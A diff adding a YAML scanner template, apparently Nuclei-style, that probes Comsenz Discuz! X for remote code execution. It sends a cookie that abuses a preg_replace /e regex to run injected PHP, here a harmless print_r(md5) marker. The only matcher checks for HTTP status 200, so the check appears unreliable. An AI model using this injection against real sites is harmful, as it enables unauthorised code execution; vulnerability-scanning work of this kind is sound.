@@ -1,0 +1,20 @@
+id: yaml-poc-comsenz-discuzx-rce-CT-158801
+info:
+  name: Yaml Poc Comsenz Discuzx Rce Ct 158801
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-comsenz-discuzx-rce-CT-158801'
+  tags: rce
+  reference: []
+http:
+- method: GET
+  path:
+  - /viewthread.php?tid=10
+  headers:
+    Cookie: GLOBALS%5B_DCACHE%5D%5Bsmilies%5D%5Bsearcharray%5D=/.*/eui; GLOBALS%5B_DCACHE%5D%5Bsmilies%5D%5Breplacearray%5D=print_r(md5({{rand}}));
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
